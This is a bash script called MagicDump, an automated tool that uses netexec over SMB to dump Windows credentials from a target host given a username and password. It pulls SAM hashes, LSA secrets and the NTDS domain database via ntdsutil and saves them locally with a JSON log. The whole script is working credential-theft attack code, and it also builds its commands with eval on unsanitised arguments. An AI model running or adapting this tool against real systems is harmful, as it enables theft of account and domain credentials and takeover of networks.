#!/usr/bin/env bash

# Define directories
BASE_DIR="$HOME/.magicdump"
LOG_DIR="$BASE_DIR/logs"
DUMP_DIR="$BASE_DIR/dumps"

# Create directories if they don't exist
mkdir -p "$LOG_DIR"
mkdir -p "$DUMP_DIR"

# Colors
RED='\033[0;31m'
YELLOW='\033[0;33m'
GREEN='\033[0;32m'
BLUE='\033[0;34m'
RESET='\033[0m'

# Dynamic banner
echo -e "${BLUE}==============================${RESET}"
echo -e "${GREEN}       MagicDump v1.0       ${RESET}"
echo -e "${BLUE}==============================${RESET}"

# Check for required tools
if ! command -v nxc &>/dev/null; then
  echo -e "${RED}[ERROR]${RESET} netexec (nxc) is not installed or not in the PATH."
  exit 1
fi
if ! command -v jq &>/dev/null; then
  echo -e "${RED}[ERROR]${RESET} jq is not installed or not in the PATH."
  exit 1
fi

# Trap to clean up temporary files on exit
trap "rm -f tmp.$$.json" EXIT

# Usage function for help
usage() {
  echo "MagicDump - Automated Windows Credential Dumping Tool"
  echo ""
  echo "Usage: $0 -t <target_ip> -u <username> -p <password> [-v|--verbose]"
  echo ""
  echo "Options:"
  echo "  -t, --target     Target IP address of the Windows machine"
  echo "  -u, --username   Username for authentication"
  echo "  -p, --password   Password for authentication"
  echo "  -v, --verbose    Enable verbose output for debugging"
  echo "  -h, --help       Show this help message and exit"
  echo ""
  exit 0
}

# Parse arguments
TARGET_HOST=""
USERNAME=""
PASSWORD=""
VERBOSE=0
while [[ $# -gt 0 ]]; do
  case "$1" in
    -t|--target)
      TARGET_HOST="$2"
      shift 2
      ;;
    -u|--username)
      USERNAME="$2"
      shift 2
      ;;
    -p|--password)
      PASSWORD="$2"
      shift 2
      ;;
    -v|--verbose)
      VERBOSE=1
      shift
      ;;
    -h|--help)
      usage
      ;;
    *)
      echo -e "${RED}[ERROR]${RESET} Unknown argument: $1"
      usage
      ;;
  esac
done

# Check for required arguments
if [[ -z "$TARGET_HOST" || -z "$USERNAME" || -z "$PASSWORD" ]]; then
  echo -e "${RED}[ERROR]${RESET} Missing required arguments!"
  usage
fi

# Verbose mode
[[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Verbose mode enabled"

# Define log file
LOG_FILE="$LOG_DIR/report_${TARGET_HOST}_$(date +%Y%m%d%H%M%S).json"

# Initialize JSON log
cat <<EOF > "$LOG_FILE"
{
  "target_host": "$TARGET_HOST",
  "operation_time": "$(date --utc +"%Y-%m-%dT%H:%M:%SZ")",
  "credentials_dumped": {},
  "warnings": [],
  "logs": []
}
EOF

# Function to log an operation
log_operation() {
  local category="$1"
  local status="$2"
  local details="$3"
  jq ".credentials_dumped.\"$category\" = {\"status\": \"$status\", $details}" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${BLUE}[LOG]${RESET} Operation: $category, Status: $status"
}

# Function to add a log entry
add_log() {
  local message="$1"
  jq ".logs += [\"$message\"]" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${GREEN}[INFO]${RESET} $message"
}

# Function to add a warning
add_warning() {
  local warning="$1"
  jq ".warnings += [\"$warning\"]" "$LOG_FILE" > tmp.$$.json && mv tmp.$$.json "$LOG_FILE"
  echo -e "${YELLOW}[WARNING]${RESET} $warning"
}

# Function to run a command and log it
run_command() {
  local cmd="$1"
  [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} Running command: $cmd"
  eval "$cmd"
}

# Function to display credentials
display_credentials() {
  local creds="$1"
  echo -e "${GREEN}[CREDENTIALS FOUND]:${RESET}\n$creds"
}

# Function to execute SAM dump
dump_sam() {
  local output_file="$DUMP_DIR/SAM_dump_${TARGET_HOST}.txt"
  add_log "Starting SAM dump using netexec..."
  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' --sam > '$output_file' 2>/dev/null"
  if run_command "$cmd"; then
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} SAM dump completed successfully. Output saved to $output_file"
    log_operation "SAM" "success" "\"file_path\": \"$output_file\""
    add_log "SAM dump saved to $output_file"
  else
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} SAM dump failed. Check permissions or connectivity."
    log_operation "SAM" "failed" "\"error\": \"Failed to dump SAM\""
    add_warning "Failed to dump SAM on target $TARGET_HOST"
  fi
}

# Function to execute LSA dump
dump_lsa() {
  local output_file="$DUMP_DIR/LSA_dump_${TARGET_HOST}.txt"
  add_log "Starting LSA dump using netexec..."
  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' --lsa > '$output_file' 2>/dev/null"
  if run_command "$cmd"; then
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSA dump completed successfully. Output saved to $output_file"
    log_operation "LSA" "success" "\"file_path\": \"$output_file\""
    add_log "LSA dump saved to $output_file"
  else
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} LSA dump failed. Check permissions or connectivity."
    log_operation "LSA" "failed" "\"error\": \"Failed to dump LSA\""
    add_warning "Failed to dump LSA on target $TARGET_HOST"
  fi
}

# Function to execute NTDS dump using ntdsutil
dump_ntds() {
  local output_file="$DUMP_DIR/NTDS_dump_${TARGET_HOST}.txt"
  local cmd="nxc smb $TARGET_HOST -u $USERNAME -p '$PASSWORD' -M ntdsutil"

  add_log "Starting NTDS dump using ntdsutil..."
  if run_command "$cmd > '$output_file' 2>/dev/null"; then
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} NTDS dump completed successfully. Output saved to $output_file"
    log_operation "NTDS" "success" "\"file_path\": \"$output_file\", \"method\": \"ntdsutil\""
    add_log "NTDS dump saved to $output_file"
  else
    [[ $VERBOSE -eq 1 ]] && echo -e "${BLUE}[DEBUG]${RESET} NTDS dump failed. Check permissions or connectivity."
    log_operation "NTDS" "failed" "\"error\": \"Failed to dump NTDS using ntdsutil\""
    add_warning "Failed to dump NTDS on target $TARGET_HOST using ntdsutil"
  fi
}

# Main script logic
add_log "Starting MagicDump against target $TARGET_HOST"
add_log "Authenticating as user '$USERNAME'..."

# Execute SAM dump
dump_sam

# Execute LSA dump
dump_lsa

# Execute NTDS dump (ntdsutil method)
dump_ntds

# Display summary to user (without JSON dump)
echo -e "${GREEN}[INFO]${RESET} Dumping complete. Logs saved to $LOG_FILE."
